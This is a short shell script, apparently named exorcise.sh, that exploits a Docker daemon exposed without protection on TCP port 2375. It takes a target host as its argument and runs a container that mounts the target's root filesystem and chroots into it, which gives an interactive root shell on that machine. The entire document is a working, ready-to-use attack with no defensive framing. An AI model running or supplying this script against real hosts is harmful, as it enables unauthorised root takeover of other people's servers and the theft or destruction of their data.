# Script to exploit the Docker Daemon - Unprotected TCP Socket.

if [ -z "$1" ]
then
        echo "Usage: ./exorcise.sh <TARGET>"
        exit 1
fi

declare domain=$1

echo "Exploiting..."

docker -H tcp://${domain}:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
